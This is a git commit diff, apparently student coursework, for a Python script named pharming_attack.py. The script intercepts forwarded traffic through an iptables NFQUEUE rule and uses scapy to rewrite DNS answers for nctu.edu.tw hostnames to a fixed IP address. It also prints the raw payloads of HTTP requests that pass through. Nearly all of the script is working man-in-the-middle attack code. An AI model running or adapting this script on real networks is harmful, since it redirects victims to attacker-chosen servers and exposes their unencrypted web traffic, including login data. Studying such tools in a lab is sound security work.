d0c22a1d742fa65a21b3406934a7484134058ea9
cs2020 <s165477@student.dtu.dk>
2020-05-07 06:09:26 -0700

    der_er_noget_galt

--- pharming_attack.py
+++ pharming_attack.py
@@ -1,63 +1,45 @@
-from scapy.all import *
-from scapy.layers import http
+from scapy.all import DNSQR, DNS, IP, UDP, Raw, DNSRR
 from scapy.layers.http import HTTPRequest
 from netfilterqueue import NetfilterQueue
 import os
 
-dns_hosts = {
+spoof_addr = {
     b"edu.tw.": "140.113.207.246",
     b"nctu.edu.tw.": "140.113.207.246",
     b"www.nctu.edu.tw.": "140.113.207.246"
 }
 
-def modify_packet(packet):
-    qname = packet[DNSQR].qname
-    if qname not in dns_hosts:
+def read_pkt(packet):
+    if packet[DNSQR].qname not in spoof_addr:
         return packet
-    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+    packet[DNS].an = DNSRR(rrname=packet[DNSQR].qname, rdata=spoof_addr[packet[DNSQR].qname])
     packet[DNS].ancount = 1
     del packet[IP].len
     del packet[IP].chksum
     del packet[UDP].len
     del packet[UDP].chksum
-#    print('DNS modified to',dns_hosts[qname])
     return packet
 
 def process_packet(packet):
-    scapy_packet = IP(packet.get_payload())
-    if scapy_packet.haslayer(DNSRR):
+    spkt = IP(packet.get_payload())
+    if spkt.haslayer(DNSRR):
         try:
-            scapy_packet = modify_packet(scapy_packet)
+            spkt = read_pkt(spkt)
         except IndexError:
             pass
-        packet.set_payload(bytes(scapy_packet))
-    if scapy_packet.haslayer(HTTPRequest):
-        #print (scapy_packet[HTTPRequest].summary())
-        print( scapy_packet[Raw])
+        packet.set_payload(bytes(spkt))
+    if spkt.haslayer(HTTPRequest):
+        print( spkt[Raw])
     packet.accept()
 
-QUEUE_NUM = 1
-os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+Q = 0
+os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(Q))
 queue = NetfilterQueue()
 try:
-    queue.bind(QUEUE_NUM, process_packet)
+    queue.bind(Q, process_packet)
     queue.run()
 except KeyboardInterrupt:
     os.system("iptables --flush")
     print('tables flushed')
 
 
-"""
-def http_header(packet):
-        http_packet=str(packet)
-        if http_packet.find('GET'):
-                return GET_print(packet)
-
-def GET_print(packet1):
-    ret = "***************************************GET PACKET****************************************************\n"
-    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
-    ret += "*****************************************************************************************************\n"
-    return ret
-sniff(prn=http_header, filter="tcp port 80")
-
-"""
